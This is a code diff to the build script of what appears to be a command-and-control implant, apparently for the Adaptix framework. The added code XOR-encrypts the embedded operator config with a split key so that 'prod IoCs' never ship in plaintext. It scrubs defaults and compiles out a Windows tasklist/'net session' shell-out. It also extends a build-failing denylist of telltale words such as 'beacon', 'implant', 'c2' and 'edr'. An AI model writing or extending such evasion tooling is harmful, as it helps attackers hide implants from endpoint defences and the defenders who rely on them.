@@ -10,6 +10,11 @@
 //      prefix, lois.config.json sidecar name
 //   4. optional esbuild minify pass (identifier mangling) when a local
 //      esbuild binary is available (tools/esbuild or PATH)
+//   5. baked config embedded XOR-encrypted with a per-build split key
+//      (--enc-strings, default ON for --bake); baked-overridden string
+//      DEFAULTS in src/config.js are scrubbed to ''
+//   6. win32 shell-out code (tasklist ps) is dead-code-eliminated by default
+//      via esbuild define __LW_SHELLOUT__=false; --allow-shellout opts in
 //
 // test/run_tests.js greps the artifact against a word denylist — a comment or
 // marker that escapes these transforms fails the suite.
@@ -88,6 +93,22 @@ function hygiene(code) {
   return code;
 }
 
+// ---- ticket 004: scrub DEFAULTS the bake overrides ---------------------------
+// Operates only on the DEFAULTS block of src/config.js. Style rules relied on
+// (enforced by tests): string defaults are single-quoted, one per line.
+function scrubBakedDefaults(configSrc, baked) {
+  const start = configSrc.indexOf('const DEFAULTS = {');
+  const end = configSrc.indexOf('\n};', start);
+  if (start < 0 || end < 0) { console.log('[build] WARN: DEFAULTS block not found — no scrub'); return configSrc; }
+  let block = configSrc.slice(start, end);
+  for (const k of Object.keys(baked)) {
+    if (typeof baked[k] !== 'string') continue;
+    const re = new RegExp('(\\n\\s*' + k + '\\s*:\\s*)\'(?:[^\'\\\\]|\\\\.)*\'');
+    block = block.replace(re, `$1''`); // absent key -> no-op
+  }
+  return configSrc.slice(0, start) + block + configSrc.slice(end);
+}
+
 function emit(mods, order) {
   const head =
 `(function (realRequire, bundleDirname) {
@@ -140,13 +161,27 @@ function findEsbuild() {
   const order = topoSort(mods, ENTRY);
 
   // --bake <config.json>: embed operator config (priority: env > sidecar > baked)
+  // --enc-strings (default ON when baking): the baked blob ships XOR-encrypted
+  // (split key) instead of as a plaintext JSON literal; overridden sensitive
+  // string DEFAULTS in src/config.js are scrubbed to '' so prod IoCs never
+  // appear twice (once encrypted in the bake, once plain in the defaults).
   let bakePre = '';
   const bakeIdx = args.indexOf('--bake');
+  const encStrings = has('enc-strings') || (!has('no-enc-strings') && bakeIdx >= 0);
   if (bakeIdx >= 0) {
     const f = args[bakeIdx + 1];
     const baked = JSON.parse(fs.readFileSync(f, 'utf8'));
-    bakePre = `globalThis.${TOK.baked} = ${JSON.stringify(baked)};\n`;
-    console.log('[build] baked config keys: ' + Object.keys(baked).join(', '));
+    if (encStrings) {
+      const json = JSON.stringify(baked);
+      const key = FIXED ? Buffer.alloc(16, 0xa5) : crypto.randomBytes(16);
+      const codes = Array.from(json).map((ch, i) => ch.charCodeAt(0) ^ key[i % key.length]);
+      bakePre = `globalThis.${TOK.baked}={d:${JSON.stringify(codes)},k1:${JSON.stringify(Array.from(key.slice(0, 8)))},k2:${JSON.stringify(Array.from(key.slice(8)))}};\n`;
+      mods.config = scrubBakedDefaults(mods.config, baked);
+      console.log('[build] baked config ENCRYPTED (' + json.length + ' chars, split-key XOR) + defaults scrubbed');
+    } else {
+      bakePre = `globalThis.${TOK.baked} = ${JSON.stringify(baked)};\n`;
+      console.log('[build] baked config keys: ' + Object.keys(baked).join(', '));
+    }
   }
 
   let bundle = bakePre + emit(mods, order);
@@ -154,14 +189,19 @@ function findEsbuild() {
   fs.writeFileSync(plainPath, bundle);
   console.log(`[build] plain -> ${plainPath} (${bundle.length} bytes)`);
 
+  let minified = false;
   if (!has('no-min')) {
     const esb = findEsbuild();
     if (esb) {
-      const r = spawnSync(esb, ['--minify', '--platform=node', '--target=node18'],
+      // --allow-shellout: compile IN the win32 tasklist path (default builds
+      // dead-code-eliminate it — ticket 001; see src/fsops.js psList)
+      const defs = `--define:globalThis.__LW_SHELLOUT__=${has('allow-shellout') ? 'true' : 'false'}`;
+      const r = spawnSync(esb, ['--minify', '--platform=node', '--target=node18', defs],
         { input: bundle, encoding: 'utf8', maxBuffer: 64 << 20 });
       if (r.status === 0) {
         fs.writeFileSync(plainPath, r.stdout);
-        console.log(`[build] minified (${r.stdout.length} bytes)`);
+        minified = true;
+        console.log(`[build] minified (${r.stdout.length} bytes, shellout=${has('allow-shellout') ? 'ON' : 'off'})`);
       } else console.log('[build] esbuild failed, kept plain: ' + r.stderr.slice(0, 200));
     } else {
       console.log('[build] esbuild not found — shipping comment-stripped plain bundle (pass --no-min to silence)');
@@ -172,6 +212,12 @@ function findEsbuild() {
   // protocol-required by the stock listener template — exempt it from the scan)
   const shipped = fs.readFileSync(plainPath, 'utf8').replace('<<<PAYLOAD_DATA>>>', '');
   const denied = ['lois', 'beacon', 'adaptix', 'implant', 'inject', 'c2 ', ' edr', 'airlock'];
+  // ticket 001: shellout strings may only survive in --allow-shellout builds;
+  // the assertion needs the minify pass (dead-code elim) to have run
+  if (!has('allow-shellout')) {
+    if (minified) denied.push('child_process', 'tasklist', 'net session');
+    else if (!has('no-min')) console.log('[build] WARN: unminified fallback — shellout strings not eliminated (dev artifact only)');
+  }
   const hits = denied.filter((w) => shipped.toLowerCase().includes(w));
   if (hits.length) {
     console.error('[build] HYGIENE FAIL — denylist words in artifact: ' + hits.join(', '));
